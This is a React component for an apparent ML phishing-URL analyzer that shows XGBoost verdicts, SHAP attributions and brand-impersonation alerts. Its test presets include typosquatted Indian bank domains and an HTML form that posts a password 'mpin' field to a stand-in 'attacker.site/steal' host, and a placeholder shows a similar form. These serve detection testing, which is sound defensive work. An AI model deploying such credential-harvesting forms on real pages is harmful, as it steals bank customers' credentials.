import React, { useState, useEffect } from 'react';
import { 
  ShieldAlert, 
  ShieldCheck, 
  Search, 
  Zap, 
  Cpu, 
  ArrowRight, 
  Code, 
  ExternalLink, 
  RefreshCw, 
  Bot, 
  ChevronDown, 
  ChevronUp,
  AlertTriangle,
  Layers,
  ArrowLeft
} from 'lucide-react';
import { analyzeThreat, fetchThreatPresets } from '../api/client';

export function ThreatAnalyzer({ onBackToDashboard, onConsultCopilot, initialUrl = '' }) {
  const [url, setUrl] = useState(initialUrl || 'https://onlinesbi-login-verify.xyz/auth');
  const [html, setHtml] = useState('');
  const [showHtmlInput, setShowHtmlInput] = useState(false);
  const [presets, setPresets] = useState([]);
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState(null);
  const [error, setError] = useState(null);
  const [activeTab, setActiveTab] = useState('shap'); // 'shap' | 'features' | 'html'
  const [copiedFeature, setCopiedFeature] = useState(null);

  // Load presets on mount
  useEffect(() => {
    let isMounted = true;
    fetchThreatPresets()
      .then((data) => {
        if (isMounted && data?.presets) {
          setPresets(data.presets);
        }
      })
      .catch(() => {
        // Fallback presets if offline
        if (isMounted) {
          setPresets([
            {
              id: 'sbi_phish',
              name: 'SBI NetBanking Harvester',
              category: 'High Risk Phishing',
              url: 'https://onlinesbi-login-verify.xyz/auth',
              html: "<form action='https://attacker.site/steal' method='POST'><input type='password' name='mpin'><input type='submit'></form>",
              expected: 'MALICIOUS'
            },
            {
              id: 'hdfc_typo',
              name: 'HDFC Typosquatting',
              category: 'Brand Spoofing',
              url: 'https://hdfcbannk-security-portal.top/kyc-update',
              expected: 'MALICIOUS'
            },
            {
              id: 'clean_merchant',
              name: 'Amazon India Pay (Verified)',
              category: 'Legitimate Merchant',
              url: 'https://pay.amazon.in/checkout?ref=shieldpay_sample',
              expected: 'BENIGN'
            },
            {
              id: 'irctc_portal',
              name: 'IRCTC Official Portal',
              category: 'Legitimate Rail',
              url: 'https://irctc.co.in/nget/train-search',
              expected: 'BENIGN'
            }
          ]);
        }
      });
    return () => { isMounted = false; };
  }, []);

  const handleAnalyze = async (overrideUrl, overrideHtml) => {
    const targetUrl = overrideUrl !== undefined ? overrideUrl : url;
    const targetHtml = overrideHtml !== undefined ? overrideHtml : html;

    if (!targetUrl.trim()) {
      setError('Please enter a URL or payment domain to analyze.');
      return;
    }

    setLoading(true);
    setError(null);

    try {
      const data = await analyzeThreat({
        url: targetUrl.trim(),
        html: targetHtml ? targetHtml.trim() : undefined,
        include_shap: true,
        top_shap_count: 6
      });
      setResult(data);
    } catch (err) {
      setError(err.message || 'Failed to analyze threat. Please ensure the backend is running.');
    } finally {
      setLoading(false);
    }
  };

  const applyPreset = (p) => {
    setUrl(p.url);
    if (p.html) {
      setHtml(p.html);
      setShowHtmlInput(true);
    } else {
      setHtml('');
    }
    handleAnalyze(p.url, p.html || '');
  };

  // Run initial scan once
  useEffect(() => {
    if (initialUrl) {
      handleAnalyze(initialUrl, '');
    } else {
      handleAnalyze('https://onlinesbi-login-verify.xyz/auth', '');
    }
  }, []);

  const isMalicious = result?.verdict === 'MALICIOUS';
  const riskScore = result?.risk_score ?? 0;
  const confidence = result?.confidence_percent ?? 0;
  const brandAlert = result?.brand_detection;
  const shapFactors = result?.top_shap_factors || [];

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '20px', flex: 1 }}>
      {/* Top Header Card */}
      <div className="quixotic-card" style={{ padding: '16px 22px' }}>
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '12px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
            {onBackToDashboard && (
              <button 
                className="pill-action-btn"
                onClick={onBackToDashboard}
                style={{ padding: '6px 14px', fontSize: '12px' }}
              >
                <ArrowLeft size={14} />
                <span>Dashboard</span>
              </button>
            )}
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <Cpu size={20} style={{ color: 'var(--accent-primary)' }} />
                <h2 style={{ fontSize: '18px', fontWeight: 700, color: 'var(--text-primary)', margin: 0 }}>
                  TrustLens™ ML Threat Analyzer
                </h2>
              </div>
              <p style={{ margin: '4px 0 0', fontSize: '12px', color: 'var(--text-secondary)' }}>
                Real-time 26-Feature XGBoost Classifier + Phiusiil DOM Model + SHAP Feature Attribution
              </p>
            </div>
          </div>

          {/* Engine Badges */}
          <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
            <span style={{ 
              fontSize: '11px', 
              fontWeight: 700, 
              padding: '4px 8px', 
              borderRadius: '6px', 
              background: '#E5F7EC', 
              color: '#0C7A53',
              border: '1px solid #C9EBD9'
            }}>
              ⚡ XGBoost v2.0
            </span>
            <span style={{ 
              fontSize: '11px', 
              fontWeight: 700, 
              padding: '4px 8px', 
              borderRadius: '6px', 
              background: '#EFF6FF', 
              color: '#1D4ED8',
              border: '1px solid #BFDBFE'
            }}>
              🔍 SHAP TreeExplainer
            </span>
            <span style={{ 
              fontSize: '11px', 
              fontWeight: 700, 
              padding: '4px 8px', 
              borderRadius: '6px', 
              background: '#FDF4FF', 
              color: '#86198F',
              border: '1px solid #F0ABFC'
            }}>
              🏦 Brand Impersonation Guard
            </span>
          </div>
        </div>
      </div>

      {/* Main 2-Column Grid */}
      <div style={{ display: 'grid', gridTemplateColumns: '1.2fr 1.8fr', gap: '20px' }}>
        
        {/* Left Column: Input Form & Presets */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
          
          {/* URL & HTML Input Card */}
          <div className="quixotic-card" style={{ padding: '20px' }}>
            <div style={{ marginBottom: '14px' }}>
              <label style={{ display: 'block', fontSize: '13px', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '6px' }}>
                Target URL or UPI Web Redirection
              </label>
              <div style={{ position: 'relative' }}>
                <input
                  type="text"
                  value={url}
                  onChange={(e) => setUrl(e.target.value)}
                  placeholder="https://suspicious-upi-portal.xyz/login"
                  style={{
                    width: '100%',
                    padding: '12px 14px 12px 38px',
                    borderRadius: '12px',
                    border: '1.5px solid var(--border-card)',
                    fontSize: '13px',
                    outline: 'none',
                    backgroundColor: '#FAFCFA',
                    fontFamily: 'monospace',
                    boxSizing: 'border-box'
                  }}
                  onKeyDown={(e) => {
                    if (e.key === 'Enter') handleAnalyze();
                  }}
                />
                <Search size={16} style={{ position: 'absolute', left: '12px', top: '14px', color: 'var(--text-secondary)' }} />
              </div>
            </div>

            {/* Optional HTML Toggle */}
            <div style={{ marginBottom: '16px' }}>
              <button
                type="button"
                onClick={() => setShowHtmlInput(!showHtmlInput)}
                style={{
                  background: 'none',
                  border: 'none',
                  color: 'var(--accent-primary)',
                  fontSize: '12px',
                  fontWeight: 600,
                  display: 'flex',
                  alignItems: 'center',
                  gap: '4px',
                  cursor: 'pointer',
                  padding: 0
                }}
              >
                <Code size={14} />
                <span>{showHtmlInput ? 'Hide DOM HTML Input' : '+ Inspect DOM HTML Snippet (Phiusiil Model)'}</span>
              </button>

              {showHtmlInput && (
                <textarea
                  rows={4}
                  value={html}
                  onChange={(e) => setHtml(e.target.value)}
                  placeholder="<form action='https://phish.net/login'> <input type='password' name='mpin'> ... </form>"
                  style={{
                    width: '100%',
                    marginTop: '8px',
                    padding: '10px',
                    borderRadius: '8px',
                    border: '1.5px solid var(--border-card)',
                    fontSize: '12px',
                    fontFamily: 'monospace',
                    backgroundColor: '#FAFCFA',
                    boxSizing: 'border-box'
                  }}
                />
              )}
            </div>

            {/* Submit Button */}
            <button
              onClick={() => handleAnalyze()}
              disabled={loading}
              className="pill-action-btn"
              style={{
                width: '100%',
                padding: '12px',
                justifyContent: 'center',
                backgroundColor: 'var(--accent-primary)',
                color: '#FFFFFF',
                borderRadius: '12px',
                fontWeight: 700,
                fontSize: '14px',
                cursor: loading ? 'not-allowed' : 'pointer',
                opacity: loading ? 0.7 : 1
              }}
            >
              {loading ? (
                <>
                  <RefreshCw size={16} className="animate-spin" />
                  <span>Extracting Features & Running XGBoost...</span>
                </>
              ) : (
                <>
                  <Zap size={16} />
                  <span>Analyze Threat with TrustLens ML</span>
                </>
              )}
            </button>

            {error && (
              <div style={{ 
                marginTop: '12px', 
                padding: '10px 14px', 
                borderRadius: '8px', 
                backgroundColor: 'var(--color-danger-bg)', 
                color: 'var(--color-danger)', 
                fontSize: '12px',
                display: 'flex',
                alignItems: 'center',
                gap: '8px'
              }}>
                <AlertTriangle size={15} />
                <span>{error}</span>
              </div>
            )}
          </div>

          {/* Preset Attack & Clean Demos */}
          <div className="quixotic-card" style={{ padding: '18px 20px' }}>
            <span style={{ fontSize: '13px', fontWeight: 700, color: 'var(--text-primary)', display: 'block', marginBottom: '10px' }}>
              Quick Test Vectors (Judge Presets)
            </span>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
              {presets.map((p) => {
                const isPresetMalicious = p.expected === 'MALICIOUS';
                return (
                  <button
                    key={p.id}
                    onClick={() => applyPreset(p)}
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: '10px 12px',
                      borderRadius: '10px',
                      border: '1px solid var(--border-light)',
                      backgroundColor: '#FFFFFF',
                      cursor: 'pointer',
                      textAlign: 'left',
                      transition: 'all 0.15s ease'
                    }}
                    onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#F4FAF6'}
                    onMouseLeave={(e) => e.currentTarget.style.backgroundColor = '#FFFFFF'}
                  >
                    <div>
                      <div style={{ fontSize: '12px', fontWeight: 700, color: 'var(--text-primary)' }}>
                        {p.name}
                      </div>
                      <div style={{ fontSize: '11px', color: 'var(--text-secondary)', fontFamily: 'monospace' }}>
                        {p.url.length > 38 ? p.url.substring(0, 38) + '...' : p.url}
                      </div>
                    </div>
                    <span style={{
                      fontSize: '10px',
                      fontWeight: 800,
                      padding: '3px 6px',
                      borderRadius: '4px',
                      backgroundColor: isPresetMalicious ? '#FEE2E2' : '#DCFCE7',
                      color: isPresetMalicious ? '#DC2626' : '#15803D'
                    }}>
                      {p.expected}
                    </span>
                  </button>
                );
              })}
            </div>
          </div>

        </div>

        {/* Right Column: Threat Assessment & SHAP Visualizer */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
          
          {/* Main Verdict Card */}
          <div className="quixotic-card" style={{ padding: '22px' }}>
            {loading ? (
              <div style={{ textAlign: 'center', padding: '40px 20px' }}>
                <RefreshCw size={36} className="animate-spin" style={{ color: 'var(--accent-primary)', margin: '0 auto 12px' }} />
                <p style={{ fontWeight: 600, color: 'var(--text-primary)', margin: 0 }}>
                  Extracting 26 URL features & calculating SHAP attributions...
                </p>
                <p style={{ fontSize: '12px', color: 'var(--text-secondary)', marginTop: '4px' }}>
                  Evaluating entropy, domain distance, token heuristics & DOM form submits
                </p>
              </div>
            ) : result ? (
              <div>
                {/* Top Verdict Strip */}
                <div style={{ 
                  display: 'flex', 
                  alignItems: 'center', 
                  justifyContent: 'space-between',
                  paddingBottom: '16px',
                  borderBottom: '1px solid var(--border-light)',
                  marginBottom: '16px'
                }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                    {isMalicious ? (
                      <div style={{ 
                        width: '44px', 
                        height: '44px', 
                        borderRadius: '12px', 
                        backgroundColor: '#FEE2E2', 
                        display: 'flex', 
                        alignItems: 'center', 
                        justifyContent: 'center',
                        color: '#DC2626'
                      }}>
                        <ShieldAlert size={26} />
                      </div>
                    ) : (
                      <div style={{ 
                        width: '44px', 
                        height: '44px', 
                        borderRadius: '12px', 
                        backgroundColor: '#DCFCE7', 
                        display: 'flex', 
                        alignItems: 'center', 
                        justifyContent: 'center',
                        color: '#16A34A'
                      }}>
                        <ShieldCheck size={26} />
                      </div>
                    )}
                    <div>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                        <span style={{ 
                          fontSize: '16px', 
                          fontWeight: 800, 
                          color: isMalicious ? '#DC2626' : '#16A34A',
                          letterSpacing: '0.5px'
                        }}>
                          {result.verdict}
                        </span>
                        <span style={{ 
                          fontSize: '11px', 
                          fontWeight: 700, 
                          padding: '2px 8px', 
                          borderRadius: '12px',
                          backgroundColor: isMalicious ? '#FEE2E2' : '#DCFCE7',
                          color: isMalicious ? '#DC2626' : '#16A34A'
                        }}>
                          Confidence: {confidence.toFixed(1)}%
                        </span>
                      </div>
                      <span style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>
                        Inference Latency: <strong>{result.inference_ms ?? 1.2}ms</strong>
                      </span>
                    </div>
                  </div>

                  {/* Risk Score Circle */}
                  <div style={{ textAlign: 'right' }}>
                    <div style={{ fontSize: '28px', fontWeight: 900, color: isMalicious ? '#DC2626' : '#16A34A', lineHeight: 1 }}>
                      {riskScore}
                      <span style={{ fontSize: '14px', color: 'var(--text-secondary)', fontWeight: 500 }}>/100</span>
                    </div>
                    <span style={{ fontSize: '11px', fontWeight: 700, textTransform: 'uppercase', color: 'var(--text-secondary)' }}>
                      TrustLens Risk
                    </span>
                  </div>
                </div>

                {/* Brand Impersonation Alert */}
                {brandAlert?.is_impersonating && (
                  <div style={{ 
                    padding: '12px 14px', 
                    borderRadius: '10px', 
                    backgroundColor: '#FEF3C7', 
                    border: '1.5px solid #F59E0B',
                    marginBottom: '16px'
                  }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', color: '#B45309', fontWeight: 700, fontSize: '13px' }}>
                      <AlertTriangle size={16} />
                      <span>Brand Impersonation Detected!</span>
                    </div>
                    <p style={{ margin: '4px 0 0', fontSize: '12px', color: '#92400E' }}>
                      This domain mimics <strong>{brandAlert.target_brand}</strong> (Official: <code>{brandAlert.official_domain}</code>) with a string similarity index of <strong>{((brandAlert.similarity || 0) * 100).toFixed(0)}%</strong>.
                    </p>
                  </div>
                )}

                {/* Tab Navigation */}
                <div style={{ display: 'flex', gap: '8px', borderBottom: '1px solid var(--border-light)', marginBottom: '14px' }}>
                  <button
                    onClick={() => setActiveTab('shap')}
                    style={{
                      padding: '8px 14px',
                      background: 'none',
                      border: 'none',
                      borderBottom: activeTab === 'shap' ? '2px solid var(--accent-primary)' : '2px solid transparent',
                      fontWeight: activeTab === 'shap' ? 700 : 500,
                      color: activeTab === 'shap' ? 'var(--accent-primary)' : 'var(--text-secondary)',
                      cursor: 'pointer',
                      fontSize: '13px'
                    }}
                  >
                    SHAP Factor Contributions
                  </button>
                  <button
                    onClick={() => setActiveTab('features')}
                    style={{
                      padding: '8px 14px',
                      background: 'none',
                      border: 'none',
                      borderBottom: activeTab === 'features' ? '2px solid var(--accent-primary)' : '2px solid transparent',
                      fontWeight: activeTab === 'features' ? 700 : 500,
                      color: activeTab === 'features' ? 'var(--accent-primary)' : 'var(--text-secondary)',
                      cursor: 'pointer',
                      fontSize: '13px'
                    }}
                  >
                    URL Features (26)
                  </button>
                  {result.html_model && (
                    <button
                      onClick={() => setActiveTab('html')}
                      style={{
                        padding: '8px 14px',
                        background: 'none',
                        border: 'none',
                        borderBottom: activeTab === 'html' ? '2px solid var(--accent-primary)' : '2px solid transparent',
                        fontWeight: activeTab === 'html' ? 700 : 500,
                        color: activeTab === 'html' ? 'var(--accent-primary)' : 'var(--text-secondary)',
                        cursor: 'pointer',
                        fontSize: '13px'
                      }}
                    >
                      DOM HTML Features (23)
                    </button>
                  )}
                </div>

                {/* Tab Content: SHAP Visualizer */}
                {activeTab === 'shap' && (
                  <div>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '10px' }}>
                      <span style={{ fontSize: '12px', fontWeight: 700, color: 'var(--text-primary)' }}>
                        Top Feature Weights (SHAP Tree Explainer)
                      </span>
                      <span style={{ fontSize: '11px', color: 'var(--text-secondary)' }}>
                        Red = Threat Push (+) | Green = Safe Push (-)
                      </span>
                    </div>

                    <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                      {shapFactors.map((f, idx) => {
                        const isRiskPush = f.impact === 'increases_risk';
                        const absVal = Math.abs(f.shap_value);
                        // Scale bar max width ~100%
                        const barWidth = Math.min(100, Math.max(15, absVal * 90));

                        return (
                          <div 
                            key={idx}
                            style={{ 
                              padding: '8px 10px', 
                              borderRadius: '8px', 
                              backgroundColor: '#F8FAF9',
                              border: '1px solid var(--border-light)'
                            }}
                          >
                            <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '12px', marginBottom: '4px' }}>
                              <span style={{ fontWeight: 600, color: 'var(--text-primary)', fontFamily: 'monospace' }}>
                                {f.feature} <span style={{ color: 'var(--text-secondary)', fontWeight: 400 }}>= {f.feature_value}</span>
                              </span>
                              <span style={{ 
                                fontWeight: 700, 
                                color: isRiskPush ? '#DC2626' : '#16A34A',
                                fontFamily: 'monospace'
                              }}>
                                {isRiskPush ? `+${f.shap_value.toFixed(3)}` : `${f.shap_value.toFixed(3)}`}
                              </span>
                            </div>

                            {/* Bar Visual */}
                            <div style={{ height: '6px', width: '100%', backgroundColor: '#E2E8F0', borderRadius: '3px', overflow: 'hidden' }}>
                              <div 
                                style={{ 
                                  height: '100%', 
                                  width: `${barWidth}%`, 
                                  backgroundColor: isRiskPush ? '#EF4444' : '#10B981',
                                  borderRadius: '3px',
                                  transition: 'width 0.4s ease'
                                }} 
                              />
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  </div>
                )}

                {/* Tab Content: URL Features Table */}
                {activeTab === 'features' && (
                  <div style={{ maxHeight: '280px', overflowY: 'auto', borderRadius: '8px', border: '1px solid var(--border-light)' }}>
                    <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '12px' }}>
                      <thead>
                        <tr style={{ backgroundColor: '#F1F5F3', textAlign: 'left', color: 'var(--text-secondary)' }}>
                          <th style={{ padding: '8px 12px' }}>Feature Name</th>
                          <th style={{ padding: '8px 12px' }}>Extracted Value</th>
                        </tr>
                      </thead>
                      <tbody>
                        {Object.entries(result.url_model?.model_features || {}).map(([key, val]) => (
                          <tr key={key} style={{ borderBottom: '1px solid var(--border-subtle)' }}>
                            <td style={{ padding: '6px 12px', fontFamily: 'monospace', color: 'var(--text-primary)' }}>{key}</td>
                            <td style={{ padding: '6px 12px', fontWeight: 600, color: 'var(--accent-primary)' }}>{String(val)}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                )}

                {/* Tab Content: HTML DOM Features */}
                {activeTab === 'html' && result.html_model && (
                  <div style={{ maxHeight: '280px', overflowY: 'auto', borderRadius: '8px', border: '1px solid var(--border-light)' }}>
                    <div style={{ padding: '8px 12px', backgroundColor: '#F8FAF9', borderBottom: '1px solid var(--border-light)', display: 'flex', justifyContent: 'space-between' }}>
                      <span style={{ fontSize: '12px', fontWeight: 700 }}>DOM Phiusiil Model Prediction:</span>
                      <span style={{ 
                        fontSize: '11px', 
                        fontWeight: 800, 
                        color: result.html_model.prediction === 'MALICIOUS' ? '#DC2626' : '#16A34A' 
                      }}>
                        {result.html_model.prediction} ({result.html_model.malicious_probability.toFixed(1)}%)
                      </span>
                    </div>
                    <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '12px' }}>
                      <thead>
                        <tr style={{ backgroundColor: '#F1F5F3', textAlign: 'left', color: 'var(--text-secondary)' }}>
                          <th style={{ padding: '8px 12px' }}>HTML Feature</th>
                          <th style={{ padding: '8px 12px' }}>Extracted Value</th>
                        </tr>
                      </thead>
                      <tbody>
                        {Object.entries(result.html_model.extracted_features || {}).map(([key, val]) => (
                          <tr key={key} style={{ borderBottom: '1px solid var(--border-subtle)' }}>
                            <td style={{ padding: '6px 12px', fontFamily: 'monospace', color: 'var(--text-primary)' }}>{key}</td>
                            <td style={{ padding: '6px 12px', fontWeight: 600, color: 'var(--accent-primary)' }}>{String(val)}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                )}

                {/* Action CTA: Consult AI Copilot */}
                <div style={{ 
                  marginTop: '18px', 
                  paddingTop: '16px', 
                  borderTop: '1px solid var(--border-light)',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between'
                }}>
                  <span style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>
                    Need in-depth forensic advice on this threat?
                  </span>
                  <button
                    onClick={() => {
                      if (onConsultCopilot) {
                        onConsultCopilot({
                          url: result.target,
                          risk_score: result.risk_score,
                          verdict: result.verdict,
                          confidence: result.confidence_percent,
                          is_impersonating: brandAlert?.is_impersonating,
                          target_brand: brandAlert?.target_brand,
                          reasons: result.reasons,
                          top_shap_factors: result.top_shap_factors
                        });
                      }
                    }}
                    className="pill-action-btn"
                    style={{
                      backgroundColor: '#1E293B',
                      color: '#F8FAFC',
                      padding: '8px 14px',
                      fontSize: '12px',
                      borderRadius: '8px',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '6px',
                      cursor: 'pointer'
                    }}
                  >
                    <Bot size={15} style={{ color: '#38BDF8' }} />
                    <span>Consult AI Security Copilot</span>
                  </button>
                </div>
              </div>
            ) : (
              <div style={{ textAlign: 'center', padding: '50px 20px', color: 'var(--text-secondary)' }}>
                <Search size={36} style={{ margin: '0 auto 12px', opacity: 0.5 }} />
                <p style={{ margin: 0, fontWeight: 600 }}>Enter a URL or select a preset test vector to inspect</p>
                <p style={{ margin: '4px 0 0', fontSize: '12px' }}>
                  The TrustLens engine will run 26-feature XGBoost inference and SHAP attribution.
                </p>
              </div>
            )}
          </div>

        </div>

      </div>
    </div>
  );
}

export default ThreatAnalyzer;
